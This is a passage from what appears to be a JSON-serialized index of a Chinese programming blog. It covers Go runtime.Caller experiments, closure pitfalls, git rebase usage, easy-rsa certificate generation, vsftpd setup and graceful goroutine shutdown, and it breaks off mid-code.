string) bool {\n\tname, file, line, ok := CallerName(skip + 1)\n\tif !ok {\n\t\treturn false\n\t}\n\tfmt.Printf(\"skip = %v, comment = %s\\n\", skip, comment)\n\tfmt.Printf(\"  file = %v, line = %d\\n\", file, line)\n\tfmt.Printf(\"  name = %v\\n\", name)\n\treturn true\n}\n```\n\n\n\n然后编写以下的测试代码(函数闭包调用/全局变量初始化/init函数等):\n\n```\nvar a = PrintCallerName(0, \"main.a\")\nvar b = PrintCallerName(0, \"main.b\")\n\nfunc init() {\n\ta = PrintCallerName(0, \"main.init.a\")\n}\n\nfunc init() {\n\tb = PrintCallerName(0, \"main.init.b\")\n\tfunc() {\n\t\tb = PrintCallerName(0, \"main.init.b[1]\")\n\t}()\n}\n\nfunc main() {\n\ta = PrintCallerName(0, \"main.main.a\")\n\tb = PrintCallerName(0, \"main.main.b\")\n\tfunc() {\n\t\tb = PrintCallerName(0, \"main.main.b[1]\")\n\t\tfunc() {\n\t\t\tb = PrintCallerName(0, \"main.main.b[1][1]\")\n\t\t}()\n\t\tb = PrintCallerName(0, \"main.main.b[2]\")\n\t}()\n}\n```\n\n输出结果如下:\n\n```\n// Output:\n// skip = 0, comment = main.a\n//   file = caller.go, line = 8\n//   name = main.init\n// skip = 0, comment = main.b\n//   file = caller.go, line = 9\n//   name = main.init\n// skip = 0, comment = main.init.a\n//   file = caller.go, line = 12\n//   name = main.init·1\n// skip = 0, comment = main.init.b\n//   file = caller.go, line = 16\n//   name = main.init·2\n// skip = 0, comment = main.init.b[1]\n//   file = caller.go, line = 18\n//   name = main.func·001\n// skip = 0, comment = main.main.a\n//   file = caller.go, line = 23\n//   name = main.main\n// skip = 0, comment = main.main.b\n//   file = caller.go, line = 24\n//   name = main.main\n// skip = 0, comment = main.main.b[1]\n//   file = caller.go, line = 26\n//   name = main.func·003\n// skip = 0, comment = main.main.b[1][1]\n//   file = caller.go, line = 28\n//   name = main.func·002\n// skip = 0, comment = main.main.b[2]\n//   file = caller.go, line = 30\n//   name = main.func·003\n```\n\n\n\n观察输出结果, 可以发现以下几个规律:\n\n- 全局变量的初始化调用者为 `main.init` 函数\n- 自定义的 `init` 函数有一个数字后缀, 根据出现的顺序进编号. 比如 `main.init·1` 和 `main.init·2` 等.\n- 闭包函数采用 `main.func·001` 格式命名, 安装闭包定义结束的位置顺序进编号.\n\n \n\n## 不同 Go 程序启动流程\n\n基于函数调用者信息可以很容易的验证各种环境的程序启动流程.\n\n我们需要建立一个独立的 `caller` 目录, 里面有三个测试代码.\n\n`caller/main.go` 主程序:\n\n```\npackage main\n\nimport (\n\t\"fmt\"\n\t\"regexp\"\n\t\"runtime\"\n)\n\nfunc main() {\n\t_ = PrintCallerName(0, \"main.main._\")\n}\n\nfunc PrintCallerName(skip int, comment string) bool {\n\t// 实现和前面的例子相同\n}\n\nfunc CallerName(skip int) (name, file string, line int, ok bool) {\n\t// 实现和前面的例子相同\n}\n```\n\n`caller/main_test.go` 主程序的测试文件(同在一个`main`包):\n\n```\npackage main\n\nimport (\n\t\"fmt\"\n\t\"testing\"\n)\n\nfunc TestPrintCallerName(t *testing.T) {\n\tfor skip := 0; ; skip++ {\n\t\tname, file, line, ok := CallerName(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, name = %v, file = %v, line = %v\\n\", skip, name, file, line)\n\t}\n\tt.Fail()\n}\n```\n\n`caller/example_test.go` 主程序的包的调用者(在新的`main_test`包):\n\n```\npackage main_test\n\nimport (\n\tmyMain \".\"\n\t\"fmt\"\n)\n\nfunc Example() {\n\tfor skip := 0; ; skip++ {\n\t\tname, file, line, ok := myMain.CallerName(skip)\n\t\tif !ok {\n\t\t\tbreak\n\t\t}\n\t\tfmt.Printf(\"skip = %v, name = %v, file = %v, line = %v\\n\", skip, name, file, line)\n\t}\n\t// Output: ?\n}\n```\n\n然后进入 `caller` 目录, 运行 `go run test` 可以得到以下的输出结果:\n\n```\nskip = 0, name = caller.TestPrintCallerName, file = caller/main_test.go, line = 10\nskip = 1, name = testing.tRunner, file = $(GOROOT)/src/pkg/testing/testing.go, line = 391\nskip = 2, name = runtime.goexit, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\n--- FAIL: TestPrintCallerName (0.00 seconds)\n--- FAIL: Example (2.0001ms)\ngot:\nskip = 0, name = caller_test.Example, file = caller/example_test.go, line = 10\n\nskip = 1, name = testing.runExample, file = $(GOROOT)/src/pkg/testing/example.go, line = 98\nskip = 2, name = testing.RunExamples, file = $(GOROOT)/src/pkg/testing/example.go, line = 36\nskip = 3, name = testing.Main, file = $(GOROOT)/src/pkg/testing/testing.go, line = 404\nskip = 4, name = main.main, file = $(TEMP)/go-build365033523/caller/_test/_testmain.go, line = 51\nskip = 5, name = runtime.main, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 220\nskip = 6, name = runtime.goexit, file = $(GOROOT)/src/pkg/runtime/proc.c, line = 1394\nwant:\n?\nFAIL\nexit status 1\nFAIL    caller        0.254s\n```\n\n分析输出数据我们可以发现, 测试代码和例子代码的启动流程和普通的程序流程都不太一样.\n\n`测试代码`的启动流程:\n\n1. `runtime.goexit` 还是入口\n2. 但是 `runtime.goexit` 不在调用 `runtime.main` 函数, 而是调用 `testing.tRunner` 函数\n3. `testing.tRunner` 函数由 `go test` 命令生成, 用于执行各个测试函数\n\n`例子代码`的启动流程:\n\n1. `runtime.goexit` 还是入口\n2. 然后 `runtime.goexit` 调用 `runtime.main` 函数\n3. 最终 `runtime.main` **调用go test 命令生成的 main.main 函数**, 在 `_test/_testmain.go` 文件\n4. 然后调用 `testing.Main`, 改函数执行各个例子函数\n\n另外, 从这个例子我们可以发现, 我们自己写的 `main.main` 函数所在的 `main` 包也 可以被其他包导入. 但是其他包导入之后的 `main` 包里的 `main` 函数就不再是 `main.main` 函数了. 因此, 程序的入口也就不是自己写的 `main.main` 函数了.\n\n\n\n## 总结\n\nGo 语言 `runtime` 包的 `runtime.Caller` / `runtime.Callers` / `runtime.FuncForPC` 等函数虽然看起来比较简单, 但是功能却非常强大.\n\n这几个函数不仅可以解决一些实际的工程问题 , 而且非常适合用于调试和分析各种Go程序的运行时信息.\n","tags":["golang"],"categories":["golang"]},{"title":"golang闭包的坑","url":"%2Fp%2F4c5612cb.html","content":"\n### 循环内goroutine使用闭包\n\n```\nfunc main() {                \n    s := []string{\"a\", \"b\", \"c\"}                             \n    for _, v := range s { \n        go func() {\n            fmt.Println(v)\n        }()                 \n    }                                                                             \n}\n```\n\n改进:\n\n```\nfunc main() {                \n    s := []string{\"a\", \"b\", \"c\"}                             \n    for _, v := range s { \n        go func(v string) {\n            fmt.Println(v)\n        }(v)      \n    }                                                                            \n}\n```\n\n<!-- more -->\n\n## 循环内闭包函数列表\n\n```\nfunc test() []func() {\n    var s []func()\n\n    for i := 0; i < 3; i++ {\n        s = append(s, func() {  \n            fmt.Println(&i, i)\n        })\n    }\n\n    return s    \n}\nfunc main() {\n    for _, f := range test() { \n        f()   \n    }\n}\n```\n\n改进:\n\n```\nfunc test() []func() {\n    var s []func()\n    \n    for i := 0; i < 3; i++ {\n        x := i                 \n        s = append(s, func() {\n            fmt.Println(&x, x)\n        })\n    }\n\n    return s\n}\nfunc main() {\n    for _, f := range test() {\n        f()\n    }\n}\n```\n\n\n\n### defer延迟调用闭包\n\n```\nfunc main() {\n    x, y := 1, 2\n\n    defer func(a int) { \n        fmt.Printf(\"x:%d,y:%d\\n\", a, y)  // y 为闭包引用\n    }(x) // 复制 x 的值\n\n    x += 100\n    y += 100\n    fmt.Println(x, y)\n}\n\n\n101 102\nx:1,y:102\n```\n","tags":["golang"],"categories":["golang"]},{"title":"不会rebase就等于没学过Git","url":"%2Fp%2Fb1718ace.html","content":"\n\n\n## 什么是rebase \n\nRebase对于很多人来说是一个很抽象的概念，也因此它的学习门槛就在于如何了解这个抽象的概念。对于rebase 比较恰当的比喻应该是「移花接木」，简单来讲把你的分支接到别的分支上，稍后我们用几个图来示范merge与rebase 的差异。\n\n\n\n了解rebase之前，我们必须了解什么是base。对Git的使用者而言，在分支中进行开发活动是稀松平常的事情，也因此在合并管理分支时，也就需要了解分支是在哪个时间点哪个提交点分出来的旁支，而长出旁支来的提交点，对于旁支来说就是base commit，也就是base。所以简单来说，rebase其实就是改变分支的base的功能。\n\n \n\n下图是在merge的情况会产生的版本演进的示意图，可以看到在新的分支中所做的变更，在合并之后，一并成为一个新的提交(commit 6)。而commit 1就是New Branch的base。\n\n![1](不会rebase就等于没学过Git/1.png)\n\n\n\n\n\n<!-- more -->\n\n而下图是rebase 的情况下会产生的版本演进的示意图。我们同样是在分支中进行开发的动作，但是在rebase时，与merge不同的是，Git会将分支上所做的变更先暂存起来，接着把newbase (或称新基准点)合并进来，最后直接将刚刚暂存起来的变更在分支上重演，这边用「重演」这个字眼是表示「**rebase不是将提交(commit)复制到分支上，而是将整个变更过程一个一个重新套用到分支上**」 ，也就因为如此commit 2'与commit 3'，才会有另外的'符号表示与原本的commit 2 , commit 3不同，这点可以从commit的SHA1凑值不同看出来，虽然变更的内容相同，但是commit编号是不同的。本文会在稍后利用范例演示一遍。\n\n![1](不会rebase就等于没学过Git/2.png)\n\n也就因为如此，所以rebase的行为就很像「移花接木」，以上图来说，就是把New Branch的变更整个接到Master上。这样的好处就是 commit 更像一条直线,更优雅.\n\n \n\n\n\n## Rebase -基础用法\n\n以下我们用一个情境示范rebase的「基础用法」：\n\n> 你是一位team leader，你的其中一项职务就是负责进行程式码审查(code review)，并且将不同程式分支进行合并管理。\n>\n> 现在有2位程式设计师以develop分支为基础，分别开了新的分支feature-a与feature-b，也都已经完工了。你希望利用rebase的方式将这2个分支并入develop中。\n\n 首先，develop的日志如下所示：\n\n```\ncommit 38844ba14312c642dcd0f72baf031de0c50ad736\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:41:04 2014 +0800\n\n    add HelloWorld.c\n\ncommit 3908e6bc1007f12566fdb5a0fb43f4055560b880\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:40:42 2014 +0800\n\n    initial commit\n```\n\n接着，feature-a的日志如下所示:\n\n```\ncommit 15bf9c8954633700211f5b9d246ae67d8135cf29\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:42:48 2014 +0800\n\n    add feature_a.c\n\ncommit 38844ba14312c642dcd0f72baf031de0c50ad736\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:41:04 2014 +0800\n\n    add HelloWorld.c\n\ncommit 3908e6bc1007f12566fdb5a0fb43f4055560b880\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:40:42 2014 +0800\n\n    initial commit\n```\n\n最后是feature-b的日志：\n\n```\ncommit e9d7a6f8b27bca86ef298911d84891b8a7efeada\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:45:37 2014 +0800\n\n    add #include <stdio.h>\n\ncommit eb6436b59b7a0624f3ec5e5469ac36b37b5211e7\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:43:55 2014 +0800\n\n    add feature_b.c\n\ncommit 38844ba14312c642dcd0f72baf031de0c50ad736\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:41:04 2014 +0800\n\n    add HelloWorld.c\n\ncommit 3908e6bc1007f12566fdb5a0fb43f4055560b880\nAuthor: one.man.army <one.man.army@example.com>\nDate: Mon Sep 22 15:40:42 2014 +0800\n\n    initial commit\n```\n\n可以看到feature-a与feature-b分别比develop多出了1, 2个提交。\n\n\n\n身为一名专业的team leader，我们有着足够的信心，相信这2个分支运作的很好，因此我们用以下指令进行rebase。\n\n```\n$ git checkout develop\n$\n$ git rebase feature-a\nFirst, rewinding head to replay your work on top of it...\nFast-forwarded develop to feature-a.\n$\n$ git rebase feature-b\nFirst, rewinding head to replay your work on top of it...\nApplying: add feature_a.c\n```\n\n在上述指令中，我们先切换到develop分支中，接着我们很快的就利用指令git rebase <newbase>合并了feature-a与feature-b。此外，在上述的指令执行结果中，可以看到一行讯息显示Fast-forwarded develop to feature-a，其中的Fast-forwarded是什么意思呢？\n\n> Fast-forwarded指的就是当2个分支的头尾相接时，代表2者之间不会有conflict ，因此只要改HEAD的指向就能够迅速合并了。以本情境为例，develop的最后一个提交正好是feature-a的头，所以这两者的rebase适用Fast-forwarded模式。\n\n接下来，可以用git log看看develop的日志，我们可以从日志中发现feature-a与feature-b的commit ID都不一样了。\n\n```\n$ git log\ncommit 07ef0b8e0b1edd079fb8b69f6e6e215725b5aba4\nAuthor: spitfire-sidra <spitfire.sidra@gmail.com>\nDate: Mon Sep 22 15:42:48 2014 +0800\n\n    add feature_a.c\n\ncommit e9d7a6f8b27bca86ef298911d84891b8a7efeada\nAuthor: spitfire-sidra <spitfire.sidra@gmail.com>\nDate: Mon Sep 22 15:45:37 2014 +0800\n\n    add #include <stdio.h>\n\ncommit eb6436b59b7a0624f3ec5e5469ac36b37b5211e7\nAuthor: spitfire-sidra <spitfire.sidra@gmail.com>\nDate: Mon Sep 22 15:43:55 2014 +0800\n\n    add feature_b.c\n\ncommit 38844ba14312c642dcd0f72baf031de0c50ad736\nAuthor: spitfire-sidra <spitfire.sidra@gmail.com>\nDate: Mon Sep 22 15:41:04 2014 +0800\n\n    add HelloWorld.c\n\ncommit 3908e6bc1007f12566fdb5a0fb43f4055560b880\nAuthor: spitfire-sidra <spitfire.sidra@gmail.com>\nDate: Mon Sep 22 15:40:42 2014 +0800\n\n    initial commit\n```\n\n以上就是最简单的rebase过程。\n\n但是在这过程中，有些人可能产生了几个疑问——「为什么先rebase feature-a再rebase feature-b后，会是feature-a的日志在最上方呢？」\n\n这是由于rebase会先找出与newbase之间最近的一个共同base，然后先保留HEAD所在分支(也就是当前分支)从共同base开始的所有变更，接着从共同base开始，将newbase的变更重新套用到HEAD的所在分支后，再将方才所保留的当前分支变更一个一个套用进来，也因此feature-a会是最后的一个commit。\n\n\n\n我们一样以图示进行说明。下图**After rebase feature-a**是rebase feature-a之后的样子，可以看到rebase feature-a之后develop与feature-b的共同base是commit 38844b，因此如果要再rebase feature-b的话，commit 15bf9c会先被暂存起来，先进行rebase feature-b之后，再将刚刚暂存的commit 38844b重演一次，所以在图**After rebase feature-b**中feature-a的commit ID就从338844b变成07ef0b，这就是rebase的过程了。\n\n\n\n![1](不会rebase就等于没学过Git/3.png)\n\nAfter rebase feature-a\n\n\n\n\n\n![1](不会rebase就等于没学过Git/4.png)\n\nAfter rebase feature-b\n\n\n\n\n\n问题又来了，刚刚学的rebase会将整个分支都接上去，有时候我们不需要整个分支都接上去，只要接到分支上的某个提交的点即可，这种情况下可以使用rebase – onto进行。\n\n假设只需要接到feature-b的commit eb6436时，就可以用以下指令进行rebase：\n\n```\n$ git rebase feature-b --onto eb6436\n```\n\n又或者，想要把我们现在的分支整个接到某个分支点上面时，可以选择另一种用法：\n\n```\n$ git rebase --onto <new base-commit> <current base-commit>\n```\n\n例如，我们在feature-b分支上时，想把整个分支接到commit 3908e6 (initial commit)时，可以输入以下指令：\n\n```\n$ git co feature-b #先切换到feature-b\n$ git rebase --onto 3908e6 38844b\n```\n\n下面2 张图就是执行上述指令的前后对照。\n\n![1](不会rebase就等于没学过Git/5.png)\n\nbefore rebase –onto 3908e6 38844b\n\n\n\n![1](不会rebase就等于没学过Git/6.png)\n\nafter rebase –onto 3908e6 38844b\n\n\n\n\n\n## Rebase -进阶互动模式\n\nRebase的互动模式十分强大，可以允许我们交换提交的次序、修改提交内容、合并提交内容，甚至将一个提交拆解成多个提交。\n\n要进入互动模式的基本指令如下，base commit可以是分支上的任意一点：\n\n```\n$ git rebase -i <base commit>\n```\n\n例如，我们想利用互动模式将feature-b上的提交做一些整理时，就可以用以下指令进入互动模式：\n\n```\n$ git rebase -i 38844b\n```\n\n上述指令的意思就是我们希望将feature-b从commit 38844b之后的所有提交(`不含commit 38844b `)进行整理。\n\n接着就会出现类似以下的讯息：\n\n```\npick 1011f14 add feature_b.c\npick d26076a add #include <stdio.h>\n\n# Rebase 38844ba..d26076a onto 38844ba\n#\n# Commands:\n# p, pick = use commit\n# r, reword = use commit, but edit the commit message\n# e, edit = use commit, but stop for amending\n# s, squash = use commit, but meld into previous commit\n# f, fixup = like \"squash\", but discard this commit's log message\n# x, exec = run command (the rest of the line) using shell\n#\n# These lines can be re-ordered; they are executed from top to bottom.\n#\n# If you remove a line here THAT COMMIT WILL BE LOST.\n#\n# However, if you remove everything, the rebase will be aborted.\n#\n# Note that empty commits are commented out\n```\n\n在进一步操作前，我们必须对讯息上的几个指令(commands)进行说明：\n\n| pick:   | 保留此提交                                                   |\n| ------- | ------------------------------------------------------------ |\n| reword: | 修改提交的讯息(只改提交讯息)                                 |\n| edit:   | 保留此提交，但是需要做一些修改(例如在程式里面多加些注解)     |\n| squash: | 保留此提交，但是将上面的提交一并并入此提交，此动作会显示提交讯息供人编辑 |\n| fixup:  | 与squash相似，但是此提交的提交讯息会被上面的提交讯息取代     |\n| exec:   | 执行shell指令，例如**exec make test**进行一些测试，可以随意穿插在提交点之间 |\n\n### 变换顺序\n\n接下来，简单示范变换提交的顺序，此处我们想把提交的顺序变成先commit 1011f14再来才是commit d26076a，我们只要简单将上述的rebase讯息换成如下的讯息，也就是两行互换即可，就能够变换顺序了！\n\n```\n# 此处调换次序即可\npick d26076a add #include <stdio.h>\npick 1011f14 add feature_b.c\n\n# Rebase 38844ba..d26076a onto 38844ba\n#\n# Commands:\n# p, pick = use commit\n# r, reword = use commit, but edit the commit message\n# e, edit = use commit, but stop for amending\n# s, squash = use commit, but meld into previous commit\n# f, fixup = like \"squash\", but discard this commit's log message\n# x, exec = run command (the rest of the line) using shell\n#\n# These lines can be re-ordered; they are executed from top to bottom.\n#\n# If you remove a line here THAT COMMIT WILL BE LOST.\n#\n# However, if you remove everything, the rebase will be aborted.\n#\n# Note that empty commits are commented out\n```\n\n### 修改提交内容\n\n有些时候，我们提交之后，不免会注解忘了加或是程式内还有测试的code忘记清掉。这时候除了用git reset –soft HEAD^之外，也可以用rebase编辑那些需要修正的提交。\n\n例如，我们希望用rebase在commit 1011f14中添加几个提交，就可以将pick改成edit进入编辑状态。\n\n```\npick 1011f14 add feature_b.c\nedit d26076a add #include <stdio.h>\n\n# Rebase 38844ba..d26076a onto 38844ba\n#\n# Commands:\n# p, pick = use commit\n# r, reword = use commit, but edit the commit message\n# e, edit = use commit, but stop for amending\n# s, squash = use commit, but meld into previous commit\n# f, fixup = like \"squash\", but discard this commit's log message\n# x, exec = run command (the rest of the line) using shell\n#\n# These lines can be re-ordered; they are executed from top to bottom.\n#\n# If you remove a line here THAT COMMIT WILL BE LOST.\n#\n# However, if you remove everything, the rebase will be aborted.\n#\n# Note that empty commits are commented out\n```\n\n接下来，如果用git status就可以看到我们正在rebase的讯息：\n\n```\n$ git status\nrebase in progress; onto 38844ba\nYou are currently editing a commit while rebasing branch 'Feature-B' on '38844ba'.\n  (use \"git commit --amend\" to amend the current commit)\n  (use \"git rebase --continue\" once you are satisfied with your changes)\n\nnothing to commit, working directory clean\n```\n\n**如果你只是想修正提交讯息**，就可以用以下指令：\n\n```\n$ git commit --amend\n```\n\n**如果你需要多增加几个提交，直接编辑吧**，接着用git add <file> , git commit -m <message>等一般操作进行。最后再利用以下指令完成rebase：\n\n```\n$ git rebase --continue\n```\n\n**又或者，我们现在编辑的提交实在是太大了，可能对程式码审查的人造成困扰，例如同时修正太多个档案，我们希望拆成比较明确的多个提交**，就可以用以下指令回到未提交前的状态：\n\n```\n$ git reset HEAD^\n```\n\n然后就可以用git status列出这个提交中变更了多少档案，然后依照需求一个一个用git add加进去后提交，多提交个几次，就等于是将一个提交拆成多个提交啰！不过别忘了，要用以下指令结束rebase。\n\n```\n$ git rebase --continue\n```\n\n以上就是rebase的几个简单说明与操作。\n\n至于squash , fixup以及exec就留给各位去体验了！\n\n\n\n## Rebase出现问题时的处理方法\n\nRebase与merge一样都可能会产生**conflict**，这时候除了修正**conflict**之后再用git add <file> , git rebase –continue完成rebase之外，也可以用git rebase –abort直接放弃rebase。\n\n```\ngit rebase (--continue | --abort | --skip)\n```\n\n此外，对于rebase使用不慎时，我们会希望能够直接回复到rebase之前的状态，以下就是几个指令可以用来回复到rebase之前的状态。参考自[StackOverFlow](http://stackoverflow.com/questions/134882/undoing-a-git-rebase)。\n\n回复方法1 ：\n\n```\n# 最简单的用法\n$ git reset --hard ORIG_HEAD\n```\n\n回复方法2 ：\n\n```\n# rebase 之前先上tag\n$ git tag BACKUP\n$ ... # rebase 过程\n$ ... # rebase 过程\n$ git reset --hard BACKUP # 失败的话可以直接回复到tag BACKUP\n```\n\n回复方法3 ：\n\n```\n$ git reflog # 寻找要回复的HEAD ，以下假设是HEAD@{3}\n$ git reset --hard HEAD@{3} # 回复\n```","tags":["git"],"categories":["git"]},{"title":"esayrsa生成ssl证书","url":"%2Fp%2Fdf25a0d8.html","content":"\n### 下载release版本\n\nhttps://github.com/OpenVPN/easy-rsa/releases\n\n### 配置公钥基础设施变量\n\n```\ncp vars.example vars\nvim vars\n```\n\n修改内容示例\n\n```\nset_var EASYRSA_REQ_COUNTRY \"CN\"\nset_var EASYRSA_REQ_PROVINCE \"BeiJing\"\nset_var EASYRSA_REQ_CITY \"BeiJing\"\nset_var EASYRSA_REQ_ORG \"Wise Innovation Inc.\"\nset_var EASYRSA_REQ_EMAIL \"user@mail.com\"\nset_var EASYRSA_REQ_OU \"Wise Innovation\"\n```\n\n<!-- more -->\n\n### 初始化 easyrsa\n\n1. 初始化\n\n```\n./easyrsa init-pki      # pki/{reqs,private} dir\n```\n\n2.  生成 crt\n\n\n```\n./easyrsa build-ca      # pki/private/ca.key pki/ca.crt\n```\n\n输入密码\n\n\nEnter PEM pass phrase:\n\n\n确认密码\n\n\nVerifying - Enter PEM pass phrase:\n\n\n输入 CA 的名称, 如: Wise Innovation CA\n\n\nCommon Name (eg: your user, host, or server name)[Easy-RSA CA]:\n\n\n\n### 生成server证书 (因为用了通配符, 在 zsh 好像无效, 用 bash 执行命令)\n\n```\n./easyrsa build-server-full *.fhyx.online nopass  //用bash\n```\n\n\n\n   ### 生成client证书\n\n```\n./easyrsa build-client-full kc-spring-001 nopass \n\n./easyrsa build-client-full kc-box-001 nopass\n```","tags":["https"],"categories":["https"]},{"title":"linux开启ftp服务和golang实现ftp_server_client","url":"%2Fp%2Fd43abcbd.html","content":"\n\n\n### linux 安装 ftp 服务\n\n1 . 安装ftp\n\n```\nsudo apt-get install vsftpd\n```\n\n2. 修改配置  sudo vi /etc/vsftpd.con\n\n```\nlocal_root=/home/ftpuser\nwrite_enable=YES\nanon_mkdir_write_enable=YES\n```\n\n\n3. 添加ftp用户\n\n```\nmkdir /home/ftpuser\nsudo useradd -d /root/workspace -M ftpuser\nsudo passwd ftpuser\n```\n\n4. 调整文件夹权限\n\n```\nchown ftpuser:ftpuser  /home/ftpuser/\nsudo chmod a-w  /home/ftpuser \n```\n\n5. 修改pam.d/vsftpd\n\n```\nsudo vi /etc/pam.d/vsftpd\n#auth    required pam_shells.so //注释掉这一行\nsudo service vsftpd restart\n```\n\n6. 连接\n\n```\nftp://207.246.80.69  //通过浏览器访问\n\nmac 可以下载 filezilla 客户端进行连接\n```\n\n<!-- more -->\n\n## golang 实现 ftp-server ftp-client\n\n### server\n\nhttps://github.com/fclairamb/ftpserver \n\n### client\n\nhttps://github.com/secsy/goftp\n\nhttps://github.com/jlaffaye/ftp\n\n### io progress\n\nhttps://github.com/mitchellh/ioprogress\n\n#### 注意事项:\n\n+ 显示进度的时候要确定总的size\n\n+ 在显示进度的时候要注意设置断点续传的进度\n\n+ 列出file的名字\n\n","tags":["golang"],"categories":["golang"]},{"title":"golang优雅的等待或通知goroutine退出","url":"%2Fp%2Faca47db0.html","content":"\n\n\n### 优雅的等待goroutine退出\n\n\n\n#### 通过Channel传递退出信号\n\nGo的一大设计哲学就是：通过Channel共享数据，而不是通过共享内存共享数据。主流程可以通过channel向任何goroutine发送停止信号，就像下面这样：\n\n\n\n这种方式可以实现优雅地停止goroutine，但是当goroutine特别多的时候，这种方式不管在代码美观上还是管理上都显得笨拙不堪。\n\n```\npackage main\n\nimport (\n   \"fmt\"\n   \"time\"\n)\n\nfunc run(done chan int) {\n   for {\n      select {\n      case <-done:\n         fmt.Println(\"exiting...\")\n         done <- 1\n         break\n      default:\n      }\n\n      time.Sleep(time.Second * 1)\n      fmt.Println(\"do something\")\n   }\n}\n\nfunc main() {\n   c := make(chan int)\n\n   go run(c)\n\n   fmt.Println(\"wait\")\n   time.Sleep(time.Second * 5)\n\n   c <- 1\n   <-c\n\n   fmt.Println(\"main exited\")\n}\n```\n\n<!-- more -->\n\n#### 使用Waitgroup\n\n通常情况下，我们像下面这样使用waitgroup:\n\n1. 创建一个Waitgroup的实例，假设此处我们叫它wg\n2. 在每个goroutine启动的时候，调用wg.Add(1)，这个操作可以在goroutine启动之前调用，也可以在goroutine里面调用。当然，也可以在创建n个goroutine前调用wg.Add(n)\n3. 当每个goroutine完成任务后，调用wg.Done()\n4. 在等待所有goroutine的地方调用wg.Wait()，它在所有执行了wg.Add(1)的goroutine都调用完wg.Done()前阻塞，当所有goroutine都调用完wg.Done()之后它会返回。\n\n那么，如果我们的goroutine是一匹不知疲倦的牛，一直孜孜不倦地工作的话，如何在主流程中告知并等待它退出呢？像下面这样做：\n\n\n\n```\npackage main\n\nimport (\n   \"fmt\"\n   \"os\"\n   \"os/signal\"\n   \"sync\"\n   \"syscall\"\n)\n\ntype Service struct {\n   // Other things\n\n   ch        chan bool\n   waitGroup *sync.WaitGroup\n}\n\nfunc NewService() *Service {\n   s := &Service{\n      // Init Other things\n      ch:        make(chan bool),\n      waitGroup: &sync.WaitGroup{},\n   }\n\n   return s\n}\n\nfunc (s *Service) Stop() {\n   close(s.ch)\n   s.waitGroup.Wait()\n}\n\nfunc (s *Service) Serve() {\n   s.waitGroup.Add(1)\n   defer s.waitGroup.Done()\n\n   for {\n      select {\n      case <-s.ch:\n         fmt.Println(\"stopping...\")\n         return\n      default:\n      }\n      s.waitGroup.Add(1)\n      go s.anotherServer()\n   }\n}\nfunc (s *Service) anotherServer() {\n   defer s.waitGroup.Done()\n   for {\n      select {\n      case <-s.ch:\n         fmt.Println(\"stopping...\")\n         return\n      default:\n      }\n\n      // Do something\n   }\n}\n\nfunc main() {\n\n   service := NewService()\n   go service.Serve()\n\n   // Handle SIGINT and SIGTERM.\n   ch := make(chan os.Signal)\n   signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)\n   fmt.Println(<-ch)\n\n   // Stop the service gracefully.\n   service.Stop()\n}\n```\n\n\n\n### 优雅的通知 goroutine 退出\n\n\n\n有时候我们需要通知goroutine停止它正在干的事情，比如一个正在执行计算的web服务，然而它的客户端已经断开了和服务端的连接。\n\nGo语言并没有提供在一个goroutine中终止另一个goroutine的方法，由于这样会导致goroutine之间的共享变量落在未定义的状态上。\n\n在rocket launch程序中，我们往名字叫abort的channel里发送了一个简单的值，在countdown的goroutine中会把这个值理解为自己的退出信号。但是如果我们想要退出两个或者任意多个goroutine怎么办呢？\n\n\n\n一种可能的手段是向abort的channel里发送和goroutine数目一样多的事件来退出它们。如果这些goroutine中已经有一些自己退出了，那么会导致我们的channel里的事件数比goroutine还多，这样导致我们的发送直接被阻塞。另一方面，如果这些goroutine又生成了其它的goroutine，我们的channel里的数目又太少了，所以有些goroutine可能会无法接收到退出消息。一般情况下我们是很难知道在某一个时刻具体有多少个goroutine在运行着的。\n\n\n\n另外，当一个goroutine从abort channel中接收到一个值的时候，他会消费掉这个值，这样其它的goroutine就没法看到这条信息。为了能够达到我们退出goroutine的目的，我们需要更靠谱的策略，来通过一个channel把消息广播出去，这样goroutine们能够看到这条事件消息，并且在事件完成之后，可以知道这件事已经发生过了。\n\n\n\n回忆一下我们关闭了一个channel并且被消费掉了所有已发送的值，操作channel之后的代码可以立即被执行，并且会产生零值。我们可以将这个机制扩展一下，来作为我们的广播机制：***不要向channel发送值，而是用关闭一个channel来进行广播。***\n\n\n\n\n\n### 优雅的控制 goroutine 退出\n\n通常`Goroutine`会因为两种情况阻塞：\n\n1. IO操作，比如对`Socket`的`Read`。\n2. `channel`操作。对一个chan的读写都有可能阻塞`Goroutine`。\n\n\n\n对于情况1，只需要关闭对应的描述符，阻塞的`Goroutine`自然会被唤醒。\n\n重点讨论情况2。并发编程，`Goroutine`提供一种`channel`机制，`channel`类似管道，写入者向里面写入数据，读取者从中读取数据。如果`channel`里面没有数据，读取者将阻塞，直到有数据；如果`channel`里面数据满了，写入者将因为无法继续写入数据而阻塞。\n\n如果在整个应用程序的生命周期里，writer和reader都表现为一个`Goroutine`，始终都在工作，那么如何在应用程序结束前，通知它们终止呢？在Go中，并不推荐像abort线程那样，强行的终止`Goroutine`。因此，抽象的说，必然需要保留一个入口，能够跟writer或reader通信，以告知它们终止。\n\n \n\n\n\n我们先看reader。我们首先可以想到，利用`close`函数关闭正在读取的`channel`，从而可以唤醒reader，并退出。但是考虑到`close`并不能很好的处理writer（因为writer试图写入一个已经close的channel，将引发异常）。因此，我们需要设计一个额外的只读`channel`用于通知：\n\n```\ntype routineSignal struct {\n    done <-chan struct{}\n}\n```\n\n `routineSignal`的实例，应当通过外部生成并传递给reader，例如：\n\n```\nfunc (r *reader)init(s *routineSignal) {\n    r.signal = s\n}\n```\n\n 在reader的循环中，就可以这么写：\n\n```\nfunc (r *reader)loop() {\n    for {\n        select {\n        case <-r.signal.done:\n            return\n        case <-r.queue:\n            ....\n        }\n    